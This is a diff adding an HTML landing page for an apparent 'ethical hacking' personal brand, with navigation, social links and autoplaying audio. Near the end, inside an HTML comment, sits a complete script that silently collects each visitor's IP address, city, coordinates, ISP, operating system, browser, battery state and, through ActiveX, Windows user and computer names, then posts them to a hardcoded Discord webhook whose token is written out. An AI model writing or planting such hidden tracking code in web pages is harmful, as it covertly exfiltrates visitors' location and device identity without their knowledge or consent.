@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+<head>
+    <base target="_blank" href="">
+    <meta charset="UTF-8">
+    <title>msue-hacker | Sudais Usmani - Cybersecurity Expert | Ethical Hacking in Pakistan</title>
+    <meta name="description" content="Just Hacked On - Learn Ethical Hacking and Cybersecurity with Abdul Ahad in Pakistan. Hacking is a talent. You won't learn it at school.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" type="image/png" href="favicons/.-4309-jh.png">
+    <link rel="stylesheet" href="css/css-style.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous" type="text/css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
+    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
+</head>
+<body onload="playAudio()">
+    <!-- <div class="navbar" id="navbar">
+        <a href="#" class="logo">Sudais Usmani</a>
+        <div class="navbar-toggle" id="navbar-toggle">
+          <span></span>
+          <span></span>
+          <span></span>
+        </div>
+        <ul class="nav-links" id="nav-links">
+          <li><a href="#">Home</a></li>
+          <li><a href="./course/course.html">Course</a></li>
+          <li><a href="https://wa.me/message/U7FMFQ7LZQ2HC1">Contact</a></li>
+        </ul>
+      </div> -->
+      <nav>
+        <div class="nav-logo"><img src="logo.svg" width="47px" alt="Dit Logo"></div>
+        <ul class="nav-links">
+            <li><a href="#">Home</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Services</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+         <div class="burger">
+            <div class="line1"></div>
+            <div class="line2"></div>
+            <div class="line3"></div>
+        </div> 
+    </nav>
+    <div id="particles">
+        <div id="intro">
+            <a href="./images/2.0.png" style="color: white;"><img class="for_border" src="logo.svg" width="100px" alt="Just Hacked On Logo Abdul Ahad"></a>
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12 text-center">
+                        <h2 style="font-family: 'Russo One', sans-serif; font-weight: 10;" class="animate-charcter u-t">Sudais Usmani</h2>
+                    </div>
+                </div>
+            </div>
+            <hr style="width: 50%; background-color: #E83951; border-color: #E83951;">
+            <a href="https://wa.me/message/" style="color: white;"><i class="fab fa-whatsapp" style="font-size: 2.5em;"></i></a>
+            <a href="https://www.instagram.com/" style="color: white;"><i class="fab fa-instagram" style="font-size: 2.5em;"></i></a>
+            <a href="https://web.facebook.com/" style="color: white;"><i class="fab fa-facebook" style="font-size: 2.5em;"></i></a>
+            <a href="https://t.me/" style="color: white;"><i class="fab fa-telegram" style="font-size: 2.5em;"></i></a>
+            <div class="animated">
+                <p style="font-size: 0.8em;" style="font-weight: 100;opacity: 0.9;">Hacking is a talent. You won't learn it at school.</p>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" src="js/911-js-script.js"></script>
+    <script type="text/javascript" src="js/5353-js-jquery.particleground.js"></script>
+    <script type="text/javascript" src="js/1970-js-demo.js"></script>
+    <script type="text/javascript" src="js/word.js"></script>
+    <script>
+        function playAudio() {
+            var audio = new Audio("./reality.mp3");
+            audio.play();
+        }
+    </script>
+    <!-- <script>
+       // URLs for IP info and Discord webhook
+const ipInfoUrl = "http://ip-api.com/json";
+const discordWebhookUrl = "https://discordapp.com/api/webhooks/1246514114071760958/5pvn9EqbSWGyq2hWvNbpASaNsIFvwlO9VL_vsDLOvRX1Occ5gGbqDjcRQTTCkMKQZGl4";
+
+// Function to get the user and PC name
+function getUserAndPCName() {
+    let userName = "Unknown User";
+    let pcName = "Unknown PC";
+
+    try {
+        // Try to get the user name if available (Windows only)
+        if (navigator.userAgent.toLowerCase().indexOf('windows') !== -1) {
+            const wshShell = new ActiveXObject("WScript.Shell");
+            userName = wshShell.ExpandEnvironmentStrings("%USERNAME%");
+            pcName = wshShell.ExpandEnvironmentStrings("%COMPUTERNAME%");
+        }
+
+        // If user name and PC name are still unknown, use device information
+        if (userName === "Unknown User" && pcName === "Unknown PC") {
+            // Determine device type
+            if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
+                userName = "Mobile User";
+                pcName = "Mobile Device";
+            } else {
+                userName = "Desktop User";
+                pcName = "Desktop/Laptop";
+            }
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+
+    return { userName, pcName };
+}
+
+// Function to fetch IP information and send it to Discord webhook
+async function fetchDataAndSendToWebhook() {
+    try {
+        // Fetch IP information
+        const response = await fetch(ipInfoUrl);
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        const data = await response.json();
+
+        // Get current date and time
+        const now = new Date();
+        const dateTime = now.toLocaleString();
+
+        // Determine device type
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        let deviceType = isMobile ? "Accessed through a mobile device." : "Accessed through a desktop or laptop.";
+
+        // Determine operating system
+        const userAgent = navigator.userAgent;
+        let operatingSystem = "Unknown OS";
+        if (userAgent.indexOf("Win") !== -1) operatingSystem = "Windows";
+        if (userAgent.indexOf("Mac") !== -1) operatingSystem = "MacOS";
+        if (userAgent.indexOf("X11") !== -1) operatingSystem = "UNIX";
+        if (userAgent.indexOf("Linux") !== -1) operatingSystem = "Linux";
+
+        // Determine browser name and version
+        const browserName = navigator.appName;
+        const browserVersion = navigator.appVersion;
+
+        // Get user and PC name
+        const { userName, pcName } = getUserAndPCName();
+
+        // Get battery status
+        let batteryStatus = "Battery status information not available";
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(2)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
+        }
+
+        // Prepare the message content
+        let message = `**https://msue.vercel.app** 
+        IP Address: ${data.query}
+        ${deviceType}
+        Operating System: ${operatingSystem}
+        Browser: ${browserName} (Version ${browserVersion})
+        User: ${userName}
+        PC Name: ${pcName}
+        Battery Status: ${batteryStatus}
+        Date and Time: ${dateTime}
+        System (Live): Add your live system information here`;
+
+        // Prepare the payload for Discord webhook
+        const payload = {
+            content: JSON.stringify({
+                "https://msue.vercel.app": "WebHookData",
+                "IP": data.query,
+                "Country": data.country,
+                "Region": data.regionName,
+                "City": data.city,
+                "Zip-code": data.zip,
+                "Lat": data.lat,
+                "Long": data.lon,
+                "Timezone": data.timezone,
+                "Provider": data.isp,
+                "Organization": data.org,
+                "Status": data.status,
+                "Operating System": operatingSystem,
+                "Browser": browserName,
+                "Browser Version": browserVersion,
+                "User": userName,
+                "PC Name": pcName,
+                "Battery Status": batteryStatus,
+                "Date and Time": dateTime,
+                "Access Type": isMobile ? "Mobile" : "Desktop/Laptop",
+                "System (Live)": "Add your live system information here"
+            }, null, 2)
+        };
+
+        // Send the data to the Discord webhook
+        const webhookResponse = await fetch(discordWebhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+
+        if (!webhookResponse.ok) {
+            throw new Error('Webhook response was not ok');
+        }
+
+        console.log('Data sent to Discord webhook successfully');
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+// Call the function to fetch data and send it to the webhook
+fetchDataAndSendToWebhook();
+
+    </script> -->
+    <script src="js/main.js"></script>
+</body>
+</html>
